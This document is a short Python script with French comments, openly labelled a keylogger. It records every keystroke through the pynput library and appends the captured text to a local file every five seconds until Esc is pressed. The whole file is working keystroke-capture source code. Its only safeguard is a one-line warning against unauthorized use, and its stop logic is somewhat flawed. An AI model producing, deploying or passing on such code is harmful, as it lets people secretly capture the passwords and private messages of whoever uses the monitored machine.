#!/usr/bin/python


from pynput import keyboard
import threading 
import os
import argparse

# prends en argument une touche de clavier et affiche sa valeur 
log = ""
stop_event = threading.Event()

def processkeys(key):
    global log 
    try :
        log += key.char
    except AttributeError :
        if key == keyboard.Key.space : 
            log += " "
        elif key == keyboard.Key.enter : 
            log += "\n"
        elif key == keyboard.Key.backspace :
            log = log[:-1]
        elif key in [keyboard.Key.right, keyboard.Key.left, keyboard.Key.up, keyboard.Key.down] :
            log += ""
        elif key == keyboard.Key.esc :
            stop_event.set() # Définit l'événement d'arrêt pour interrompre le programme

def report(path):
    global log
    with open(path, "a") as logfile:
        logfile.write(log)
        logfile.close()
    log = "" # Réinitialise la variable log après l'avoir écrite dans le fichier

    # Si l'événement d'arrêt est défini, arrête le thread de rapport
    if not stop_event.is_set():
        threading.Timer(5.0, report, args=[path]).start()

def main():
    parser = argparse.ArgumentParser(description="ce script est un Keylogger.Merci de ne pas l'utiliser sur un système d'information sans autorisation!!!")
    parser.add_argument("-o", dest="path",help="chemin pur enregistrer les logs",required=True)
    args = parser.parse_args()
    path = os.path.abspath(args.path)
    if not os.path.exists(os.path.dirname(path)):
        parser.error("Merci de spécifier un chemin de fichier valide")
    
    # Keyboard_listener écoute le clavier et appelle la fonction processkeys lorsque l'utilisateur appuie sur une touche de clavier
    # Le rôle de on_press est de définir la fonction à appeler lorsque l'utilisateur appuie sur une touche de clavier                                           
    keyboard_listener = keyboard.Listener(on_press=processkeys)
    keyboard_listener.start()

    # Crée un thread pour écrire le contenu de la variable log dans un fichier toutes les 5 secondes
    report_thread = threading.Timer(5.0, report, args=[path])
    report_thread.start()

    # Attends que l'événement d'arrêt soit défini
    stop_event.wait()

    # Arrête le thread de rapport
    report_thread.cancel()

    # Permet de collecter les touches de clavier
    with keyboard.Listener(on_press=processkeys) as keyboard_listener:
        keyboard_listener.join()


if __name__=='__main__':
    main()
